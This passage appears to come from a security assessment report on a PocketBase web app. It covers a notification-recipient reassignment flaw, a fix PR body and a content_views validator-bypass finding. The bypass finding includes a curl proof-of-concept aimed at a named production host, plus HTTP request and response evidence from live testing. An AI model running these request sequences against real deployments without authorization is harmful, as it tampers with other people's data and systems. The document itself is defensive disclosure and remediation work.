- `DELETE /api/collections/notifications/records/<foreign or nonexistent id>` → `404`, while deleting an owned record → `204` (delete IS ownership-scoped).
- `POST` with a foreign `recipient` → `400` (create IS bound to the caller).

Rendering path: `src/features/notifications/NotificationCard.jsx:578-591` renders `notification.title` and `notification.body` through `PostContentHtml`, and `src/features/notifications/NotificationCard.jsx:596-604` renders `badge_text` and a click-action button. `PostContentHtml` sanitizes with an allowlist (`toDisplayHtml` → `sanitizePostHtml`), so the content lands as text/markup-limited HTML rather than script — this is a spoofing/authorization defect, not XSS. The victim's feed is populated by `src/services/notifications.js:33-37` (`listNotifications`, `filter: recipient = {:uid}`).

Serve the field value through a server-side guard as well as the rule: add an `onRecordUpdateRequest` hook on `notifications` that throws a `ForbiddenError` when `e.record.get('recipient') !== e.record.original().get('recipient')` for non-superuser callers, mirroring the existing `pb_hooks/users_access_guard.pb.js` pattern already used for the `users` collection.

( ```

The attacker must know a target user id, which any authenticated user can enumerate from `GET /api/collections/users/records`. All test records created during validation were deleted afterwards.
counterevidence: Actively tested the case against the finding. (1) Considered that the server may silently ignore the `recipient` change: refuted — the 200 response body itself returned `"recipient":"z7piq9643k5995x"`, and the subsequent 404 on read-back confirms the record moved out of the attacker's ownership scope (had the field been ignored, the record would still have been readable by the attacker). (2) Considered a server-side notification queue, approval flow or superuser-only write path: no such gate blocked the write; the same collection already grants the caller create rights for self-addressed records, so the write path is a normal member capability. (3) Considered a global PocketBase rule misconfiguration: refuted by the control tests — foreign comment PATCH is 404, foreign DELETE is 404, foreign-recipient POST is 400, i.e. only the notifications UPDATE rule is loose. (4) Considered XSS via the injected fields: `NotificationCard` renders `title`/`body` through `PostContentHtml`, which sanitizes to an allowlist, so the impact is spoofing rather than script execution and no XSS is claimed. (5) Considered whether the card is really shown to the victim: the list filter is `recipient = {:uid}`, so the forged record is in scope for the victim, but the attacker cannot read the victim's feed (404 on foreign ids); this last hop was not visually confirmed from the victim's session, which is the sole remaining proof gap and is why confidence on the *displayed* effect is stated as high-on-write / not verified-from-the-victim-side. confidence_rationale: The write primitive was executed live against the production API and verified three independent ways: the 200 response echoing the new `recipient`, the attacker's subsequent 404 on the same record, and the failing control tests on neighbouring collections and on the delete/create paths. The only element not directly observed is the rendered card inside the victim's own session (the attacker's token cannot read another user's notifications, by design); the client code path that selects and renders it (`listNotifications` filtered by `recipient`, `NotificationCard` rendering `title`/`body`) is confirmed from source.

fix_pr_body:
## Summary

Any authenticated user can re-address a notification record they own to a different user by sending a single-field `PATCH` that rewrites `recipient`. Because the client lists notifications by `recipient = <current user>`, the reassigned record is delivered into the victim's notification feed with attacker-controlled title, body and click action.

## Root cause

The `notifications` collection's update rule is not pinned to the record owner and does not freeze the `recipient` field. Neighbouring rules are correct — a plain user gets `400` when creating a record for another user, and `404` when patching or deleting a foreign comment — so this is a single loose rule rather than a global misconfiguration.

Client code also creates notifications with a caller-supplied `recipient` (`maybeNotifySessionsLeft`), which gives ordinary users the seed record this update abuses.

## Proposed fix

1. Constrain the update rule to the owner and require the stored recipient to be unchanged, so a body that moves `recipient` is rejected.
2. Add a server-side `onRecordUpdateRequest` guard on `notifications` that throws `ForbiddenError` when `recipient` differs from the stored value, following the existing pattern in `pb_hooks/users_access_guard.pb.js`.
3. Move privileged notification creation server-side (or bind create `recipient` to `@request.auth.id`) so clients can no longer choose the addressed user.
4. Treat `title`/`body`/`badge_text` as immutable to non-superusers so the feed cannot be used as a phishing surface.
5. Re-audit the create/update/delete matrix for the remaining collections.

## Validation

Live reproduction on the deployed API with a low-privilege account: reassignment returned `200` with the new `recipient`, the attacker's follow-up read returned `404`, and control requests against other collections and other verbs were correctly denied. All test records were removed after validation.

title: Custom content-view route validation bypassed by direct collection write, allowing unbounded self-attributed metric rows
description: The application provides a dedicated endpoint, `POST /api/content-view`, that validates view-tracking input before storing it. The underlying `content_views` collection, however, remains directly writable through the generic PocketBase collection API with only a self-scoped rule, so an authenticated member can create view rows carrying `object_type` / `object_id` / `source` values that the application's own validator rejects. The rows cannot be read back or deleted by any non-superuser, so they accumulate permanently in the table that the moderator statistics dashboard aggregates.
impact: A member can write arbitrary, permanently-retained rows into the content-view metrics table. The application's validation — which restricts `object_type` to `post` or `tournament_post`, requires a non-empty `object_id`, and restricts `source` to `viewport` or `modal` — is bypassed. Because `content_views` has no delete rule for non-superusers, the rows cannot be cleaned up by their author, so the distortion is durable. The direct impact is capped: the statistics consumers are moderator-only and the reach report re-resolves each object server-side before presenting it, so a fabricated `object_id` does not inject a spurious entry into the displayed top-content list. The practical effect is inflated or meaningless view-metric data and unbounded table growth in an analytics collection.
poc_description:
1. Authenticate as an ordinary `user` account.
2. Send the malformed value through the application's own validated route to establish the negative control: `POST /api/content-view` with `object_type` set to an invalid value returns `400` with `object_type must be post or tournament_post`.
3. Send the identical malformed value directly to the collection endpoint: `POST /api/collections/content_views/records` with the same invalid `object_type`. The server returns `200` and creates the record, demonstrating that the validator is bypassed.
4. Confirm the row is durably stored and that the author cannot remove it: a subsequent `GET` on the record returns `403 Only superusers can perform this action`, and `DELETE` on the row also returns `403`.
5. Repeat step 3 to show that nothing limits the number of rows that can be created.
poc_script_code:
```bash
TARGET="https://app.milenkih-team.ru"
TOKEN='<low-privilege user JWT>'
SELF='<own user id>'

# 1. Negative control - the application's own route rejects the malformed value
curl -s -X POST -H "Authorization: $TOKEN" -H 'Content-Type: application/json' \
  -d '{"object_type":"zqath3bad","object_id":"zqath3abc"}' \
  "$TARGET/api/content-view"
# => 400 {"error":"object_type must be post or tournament_post"}

# 2. Validator bypass - the collection endpoint accepts the same value
curl -s -X POST -H "Authorization: $TOKEN" -H 'Content-Type: application/json' \
  -d '{"user":"'$SELF'","object_type":"zqath3bad","object_id":"zqath3abc","source":"zqath3bad"}' \
  "$TARGET/api/collections/content_views/records"
# => 200 {"id":"<new id>","user":"<self>","object_type":"zqath3bad", ...}

# 3. The row cannot be read back or deleted by its author
curl -s -H "Authorization: $TOKEN" \
  "$TARGET/api/collections/content_views/records/<new id>"
# => 403 {"message":"Only superusers can perform this action.","status":403}

curl -s -X DELETE -H "Authorization: $TOKEN" \
  "$TARGET/api/collections/content_views/records/<new id>"
# => 403 {"message":"Only superusers can perform this action.","status":403}
```
remediation_steps:
Make the data store enforce the same constraints the application route enforces.

1. Tighten the `content_views` collection rules so the generic record endpoint cannot be used as an alternate write path: restrict creation to server-side code (set the create rule to a value no client can satisfy and have the `POST /api/content-view` handler perform the write with application privileges), or add a collection-level `onRecordCreateRequest` hook that applies the same `object_type` / `object_id` / `source` validation as `createContentView`.
2. Apply the validation in one place and reuse it: have the collection hook call the same logic used by the route, so the two paths cannot drift apart again.
3. Add a delete rule (or a maintenance job) so that erroneous or abusive rows can be removed; currently no non-superuser can delete a row, and there is no visible retention policy for this table.
4. Add rate limiting or server-side de-duplication (for example, one row per user/object/time-window) to bound how many rows a single account can create, on both the route and the collection endpoint.
5. Purge the test rows left in the table: rows with `object_id` values prefixed `zqath3` were created during this assessment and could not be deleted through the API.
evidence:
Live requests as an ordinary `user` account.

Negative control — the application route rejects the malformed value:

```http
POST /api/content-view HTTP/1.1
Authorization: <user-token>
Content-Type: application/json

{"object_type":"zqath3bad","object_id":"zqath3abc"}
```
```http
HTTP/1.1 400 Bad Request
{"error":"object_type must be post or tournament_post"}
```

Validator bypass — the same value is accepted through the collection endpoint:

```http
POST /api/collections/content_views/records HTTP/1.1
Authorization: <user-token>
Content-Type: application/json

{"user":"<self>","object_type":"zqath3bad","object_id":"zqath3abc","source":"zqath3bad"}
```
```http
HTTP/1.1 200 OK
{"id":"<new id>","user":"<self>","object_type":"zqath3bad","object_id":"zqath3abc","source":"zqath3bad", ...}
```

The created row is neither readable nor deletable by its author:

```http
GET /api/collections/content_views/records/<new id> HTTP/1.1
Authorization: <user-token>
```
```http
HTTP/1.1 403 Forbidden
{"data":{},"message":"Only superusers can perform this action.","status":403}
```

```http
DELETE /api/collections/content_views/records/<new id> HTTP/1.1
Authorization: <user-token>
```
```http
HTTP/1.1 403 Forbidden
{"data":{},"message":"Only superusers can perform this action.","status":403}
```

Collection rules from the deployment's schema export:

```json
{
  "name": "content_views",
  "listRule": null,
  "viewRule": null,
  "createRule": "@request.auth.id != \"\" && user = @request.auth.id",
  "updateRule": null,
  "deleteRule": null
}
```
assumptions: Assumes an authenticated member account, which is the application's normal user role. No moderator privileges or victim interaction are required. The impact assessment assumes the moderator statistics dashboard is the only consumer of this table, which was verified by reading `pb_hooks/stats.pb.js` and `pb_hooks/statslib.js`.
counterevidence: The strongest case against this finding is that it has no direct security consequence: every consumer of `content_views` is a moderator-only statistics endpoint, the reach report re-resolves each referenced object server-side via `$app.findRecordById`, so a fabricated `object_id` cannot inject a spurious row into the displayed report, and there is no cross-user read or write — the create rule forces `user = @request.auth.id` and any attempt to attribute a row to another user is rejected with `400`. I also verified that reading the table is denied to non-superusers (`403`), so a member cannot even confirm what was written. What remains is a genuine but low-impact control gap: validation implemented for the application's own route is not enforced by the data store, an alternate write path exists for the same table, and rows created through it are permanently unremovable because the delete rule is null. It is reported because it is a real inconsistency between two paths to the same data rather than as a high-impact issue.
severity_change_conditions: Confirmation that a player-facing or public surface derives a metric from `content_views` (for example popularity ordering, or content promoted on view count) would raise the severity, since the values would then be attacker-controlled and externally visible. Conversely, confirming that the table is retained only for internal aggregate statistics with no decision-making role would lower it to informational.
